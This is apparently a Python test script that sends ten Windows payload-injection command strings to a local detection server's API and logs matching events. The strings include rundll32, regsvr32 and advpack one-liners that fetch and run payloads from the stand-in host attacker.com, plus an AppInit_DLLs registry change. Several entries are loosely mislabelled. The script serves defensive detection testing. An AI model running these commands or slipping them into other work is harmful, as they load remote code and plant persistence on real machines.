"""
simulate_payload_injection.py - Process Hollowing, DLL Injection, Payload Injection
Integrated with detector_server.py via HTTP API for command detection
Shows alerts in CMD History + System Logs
"""

import requests
import time
import json
import socket

API_URL = 'http://localhost:5000/api'
UDP_HOST = '127.0.0.1'
UDP_PORT = 9999

# ============================================================================
# PAYLOAD INJECTION ATTACKS
# ============================================================================

PAYLOAD_INJECTION_CMDS = [
    {
        'name': 'Process Hollowing - svchost.exe',
        'command': 'powershell -Command "rundll32.exe C:\\Windows\\System32\\kernel32.dll CreateProcessAsUserA"',
        'description': 'Process hollowing attack targeting svchost',
        'severity': 'CRITICAL'
    },
    
    {
        'name': 'DLL Injection via rundll32',
        'command': 'rundll32.exe javascript:\\"..\\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://attacker.com/payload")',
        'description': 'DLL injection through JavaScript',
        'severity': 'CRITICAL'
    },
    
    {
        'name': 'COM Object Hijacking',
        'command': 'powershell -c "rundll32.exe shell32.dll,ShellExec_RunDLL http://attacker.com/payload.dll"',
        'description': 'COM object exploitation for payload execution',
        'severity': 'CRITICAL'
    },
    
    {
        'name': 'regsvr32 Script Registration',
        'command': 'regsvr32 /s /n /u /i:http://attacker.com/shell.sct scrobj.dll',
        'description': 'Regsvr32 living-off-the-land binary',
        'severity': 'CRITICAL'
    },
    
    {
        'name': 'AppInit_DLLs Registry Injection',
        'command': 'reg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\\Windows\\malicious.dll"',
        'description': 'Registry-based DLL injection',
        'severity': 'CRITICAL'
    },
    
    {
        'name': 'WMI Event Consumer Injection',
        'command': 'powershell -Command "Get-WmiObject -List | Where-Object {$_.Name -like \'*EventConsumer\'} | New-Object"',
        'description': 'WMI-based payload injection',
        'severity': 'HIGH'
    },
    
    {
        'name': 'Window Subclassing Attack',
        'command': 'powershell -Command "[System.Runtime.InteropServices.Marshal]::ReadInt32([System.Diagnostics.Process]::GetCurrentProcess().Handle, 0x100)"',
        'description': 'Window subclassing for injection',
        'severity': 'HIGH'
    },
    
    {
        'name': 'SetWindowsHookEx Injection',
        'command': 'powershell -NoProfile -WindowStyle Hidden -Command "$h=[System.Reflection.Assembly]::LoadWithPartialName(\'System.Windows.Forms\'); [Windows.Forms.SendKeys]::SendWait(\'payload\')"',
        'description': 'Hook-based code injection',
        'severity': 'CRITICAL'
    },
    
    {
        'name': 'Code Cave Injection',
        'command': 'rundll32 advpack.dll,RegisterOCX http://attacker.com/shell.exe',
        'description': 'Injection into code cave for stealth',
        'severity': 'HIGH'
    },
    
    {
        'name': 'Reflective DLL Injection',
        'command': 'powershell -c "Add-Type -Path C:\\\\payload.dll; [payload.Injector]::Inject()"',
        'description': 'Reflective DLL loading without WriteFile',
        'severity': 'CRITICAL'
    }
]

# ============================================================================
# DETECTOR INTEGRATION
# ============================================================================

def send_cmd_to_detector(cmd_info):
    """Send command to detector via HTTP API"""
    try:
        response = requests.post(
            f'{API_URL}/test-cmd',
            json={
                'command': cmd_info['command'],
                'method': 'hybrid',
                'source': 'payload_injection_simulator',
                'description': cmd_info['description']
            },
            timeout=5
        )
        
        result = response.json()
        
        print(f"\n  ✅ HTTP API Response:")
        print(f"     Is Malicious: {result.get('ismalicious')}")
        print(f"     Severity: {result.get('severity', 'N/A').upper()}")
        print(f"     Confidence: {result.get('confidence', 0)*100:.1f}%")
        print(f"     Reason: {result.get('reason', 'Detection pattern matched')}")
        
        return result
        
    except Exception as e:
        print(f"\n  ❌ HTTP Error: {e}")
        return None

def send_system_event_udp(event_info):
    """Send system event via UDP (for System Logs)"""
    try:
        event = {
            'src_ip': '127.0.0.1',
            'dst_ip': '127.0.0.1',
            'reason': event_info['description'],
            'severity': event_info['severity'],
            'score': 0.9 if event_info['severity'] == 'CRITICAL' else 0.7,
            'timestamp': time.time(),
            'proto': 6,
            'duration': 0.5,
            'pkt_count': 1,
            'byte_count': 100
        }
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(json.dumps(event).encode(), (UDP_HOST, UDP_PORT))
        sock.close()
        
        print(f"  📡 System Event logged: {event_info['description']}")
        
    except Exception as e:
        print(f"  ⚠️  Could not log system event: {e}")

def simulate_payload_injection(cmd_info):
    """Simulate a single payload injection attack"""
    name = cmd_info['name']
    
    print(f"\n{'='*70}")
    print(f"💉 SIMULATING: {name}")
    print(f"{'='*70}")
    print(f"Description: {cmd_info['description']}")
    print(f"Severity: {cmd_info['severity']}")
    print(f"Command: {cmd_info['command'][:60]}...")
    print(f"{'='*70}")
    
    # Send to detector via HTTP
    print(f"\n1️⃣  Sending to detector...")
    send_cmd_to_detector(cmd_info)
    
    # Log system event
    print(f"2️⃣  Logging system event...")
    send_system_event_udp(cmd_info)
    
    time.sleep(0.5)

def run_all_payload_injection_attacks(delay_between=1):
    """Run all payload injection attack simulations"""
    print("\n" + "="*70)
    print("🛡️  PAYLOAD INJECTION ATTACK SIMULATOR")
    print("="*70)
    print(f"Total attacks: {len(PAYLOAD_INJECTION_CMDS)}")
    print(f"Delay between attacks: {delay_between}s")
    print("="*70)
    
    for i, cmd_info in enumerate(PAYLOAD_INJECTION_CMDS, 1):
        print(f"\n[{i}/{len(PAYLOAD_INJECTION_CMDS)}] Running attack...\n")
        simulate_payload_injection(cmd_info)
        
        if i < len(PAYLOAD_INJECTION_CMDS):
            print(f"⏳ Waiting {delay_between}s before next attack...")
            time.sleep(delay_between)
    
    print("\n" + "="*70)
    print("✅ PAYLOAD INJECTION SIMULATION COMPLETE")
    print("="*70)
    print("\n📊 CHECK YOUR DASHBOARD:")
    print("   → CMD History: http://localhost:5000/cmd-history")
    print("   → System Logs: http://localhost:5000/system-logs")
    print("\n   You should see:")
    print("      • 10 CRITICAL payload injection commands")
    print("      • Process Hollowing detection")
    print("      • DLL Injection detection")
    print("      • Registry manipulation detection")
    print("\n")

if __name__ == '__main__':
    import sys
    
    print("\n🚀 Payload Injection Attack Simulator")
    print("API Endpoint:", API_URL)
    print("UDP Listener:", f"{UDP_HOST}:{UDP_PORT}\n")
    
    # Check if detector is running
    try:
        response = requests.get(f'{API_URL}/health', timeout=2)
        health = response.json()
        print(f"✅ Detector is ONLINE")
        print(f"   ML Mode: {health.get('ml_mode', 'unknown')}")
        print(f"   Patterns: {health.get('cmd_patterns', 0)}\n")
    except Exception as e:
        print(f"⚠️  WARNING: Detector not responding!")
        print(f"   Error: {e}")
        print(f"   Make sure to run: python backend/detector_server.py\n")
        input("Press Enter to continue anyway...")
    
    # Run attacks
    run_all_payload_injection_attacks(delay_between=1)